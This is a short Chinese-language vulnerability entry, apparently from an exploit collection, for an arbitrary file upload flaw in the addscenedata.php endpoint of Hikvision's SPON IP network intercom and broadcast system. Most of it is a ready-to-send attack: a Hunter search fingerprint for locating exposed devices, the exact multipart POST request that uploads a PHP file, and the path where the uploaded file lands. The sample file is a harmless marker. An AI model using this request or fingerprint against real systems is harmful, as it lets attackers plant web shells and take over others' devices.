# 海康威视SPONIP网络对讲广播系统addscenedata存在任意文件上传漏洞

- **系统**：海康　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`Hunter：`web.body="vendors/custom/html5.min.js"``
- **请求**：`POST /php/addscenedata.php HTTP/1.1`
- **关键头**：`Content-Length: 218`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4LuoBRpT…`

**请求体 / payload**
```
------WebKitFormBoundary4LuoBRpTiVBo9cIQ
Content-Disposition: form-data; name="upload"; filename="tt.php"
Content-Type: text/plain
123
------WebKitFormBoundary4LuoBRpTiVBo9cIQ--

上传文件位置
/images/scene/tt.php
```

**其他**
- 海康威视SPON IP网络对讲广播系统addscenedata存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 海康威视SPON IP网络对讲广播系统